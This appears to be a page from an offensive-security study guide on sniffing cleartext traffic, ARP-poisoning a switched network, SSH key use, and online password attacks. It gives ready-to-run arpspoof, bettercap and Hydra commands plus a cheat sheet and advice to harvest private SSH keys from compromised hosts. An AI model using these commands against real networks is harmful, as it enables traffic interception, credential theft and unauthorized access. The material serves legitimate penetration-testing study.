---
title: "Sniffing, MITM & Password Attacks"
section: "Network Recon"
order: 4
description: "Intercepting cleartext traffic, ARP poisoning a switched network, and attacking authentication with Hydra and SSH keys."
tags: ["tcpdump", "wireshark", "arp-spoofing", "mitm", "hydra", "ssh", "password-attacks", "sniffing"]
---

This covers what you can do once you know a network is running cleartext protocols: intercept traffic, sit between two hosts, and attack authentication.

---

## Cleartext vs Encrypted

Cleartext protocols send credentials and data as readable bytes across every router between the client and server. Anyone with network visibility can read them.

TLS/SSL fixes this by sitting between TCP and the application layer. During the handshake, asymmetric cryptography establishes a shared secret. After that, symmetric encryption handles all data. Captured packets become unreadable noise.

| Cleartext | Port | Encrypted | Port |
|-----------|------|-----------|------|
| Telnet | 23 | SSH | 22 |
| HTTP | 80 | HTTPS | 443 |
| FTP | 21 | SFTP/FTPS | 22/990 |
| SMTP | 25 | SMTP+TLS | 587/465 |
| POP3 | 110 | POP3S | 995 |
| IMAP | 143 | IMAPS | 993 |

---

## Sniffing

Putting a network interface in **promiscuous mode** lets it capture all traffic it physically receives, not just its own.

**Problem on switched networks:** switches only forward traffic to the intended port. You only see your own traffic and broadcasts. To sniff other hosts, you need traffic flowing through your machine first.

### tcpdump

```bash
# Capture HTTP and Telnet, save to file
sudo tcpdump -i eth0 port 80 or port 23 -w capture.pcap -v

# Capture everything
sudo tcpdump -i eth0 -n -v -w full.pcap

# Live ASCII output (spot cleartext credentials instantly)
sudo tcpdump -i eth0 -A port 80
```

### Reading in Wireshark

```
http.request.method == "POST"     # Login form submissions
tcp.stream                        # Follow full TCP conversation
ftp / smtp / pop                  # Protocol-specific filters
```

Right-click any packet and "Follow TCP Stream" to reconstruct the full session. On Telnet captures, you see every keystroke.

---

## ARP Poisoning (MITM)

ARP has no authentication. Any machine can send a forged ARP reply claiming any IP belongs to its MAC, and other machines will update their ARP cache without question.

**Attack in two directions simultaneously:**
1. Tell the target: "The gateway's IP is at my MAC"
2. Tell the gateway: "The target's IP is at my MAC"

All traffic between them flows through you. You read it, forward it. The victim's connection keeps working.

```bash
# Step 1: Enable IP forwarding or traffic drops and victim loses internet
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Step 2: Poison the target
sudo arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP

# Step 3: Poison the gateway (second terminal)
sudo arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP
```

Then capture on eth0 with tcpdump or Wireshark. You will see the victim's traffic flowing through your interface.

**bettercap (modern alternative):**

```bash
sudo bettercap -iface eth0
# Inside bettercap:
net.probe on
arp.spoof on
net.sniff on
```

---

## SSH Key Authentication

SSH replaces Telnet with encrypted remote access on port 22. Two auth methods:

- **Password:** Works but vulnerable to brute force if weak
- **Key-based:** Private key on your machine, public key on server. Authentication via cryptographic challenge. No password goes over the wire.

```bash
# Generate a key pair (Ed25519 is preferred over RSA)
ssh-keygen -t ed25519 -C "label"

# Deploy public key to target server
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@TARGET_IP

# Connect using key
ssh -i ~/.ssh/id_ed25519 user@TARGET_IP
```

**Offensive note:** If you compromise a machine, check `~/.ssh/` for private keys. A key found on one server can authenticate to others across the same infrastructure.

---

## Password Attacks

**Online attacks** hit the service directly across the network:
- Constrained by latency, account lockouts, rate limiting, and IDS alerts
- Use low thread counts to avoid lockouts

**Offline attacks** crack captured hashes locally:
- No network, no lockouts, GPU speed
- Only constrained by compute power

Strategy: try default credentials first, then targeted spraying (one password across many accounts avoids lockouts), save brute force for offline hash cracking.

### Hydra (Online Brute Force)

```bash
# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP -t 4

# FTP with user list
hydra -L users.txt -P passwords.txt ftp://TARGET_IP

# HTTP POST login form
hydra -l admin -P rockyou.txt TARGET_IP http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

A successful hit looks like:
```
[22][ssh] host: 10.10.10.100   login: admin   password: password123
```

Keep `-t` low on SSH and FTP. High thread counts crash fragile services or trigger rate limiting.

---

## Cheat Sheet

```bash
# TCPDUMP
sudo tcpdump -i eth0 -w capture.pcap
sudo tcpdump -i eth0 port 80 or port 23 -v
sudo tcpdump -i eth0 -A port 80           # Live ASCII

# Wireshark filters:
# http.request.method == "POST"
# tcp.stream
# ftp / smtp / pop

# ARP POISONING
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
sudo arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP
# bettercap: net.probe on > arp.spoof on > net.sniff on

# SSH KEYS
ssh-keygen -t ed25519 -C "label"
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@TARGET
ssh -i ~/.ssh/id_ed25519 user@TARGET
# Check ~/.ssh/ on compromised hosts for reusable private keys

# HYDRA
hydra -l admin -P rockyou.txt ssh://TARGET -t 4
hydra -L users.txt -P passwords.txt ftp://TARGET
hydra -l admin -P rockyou.txt TARGET http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"
```
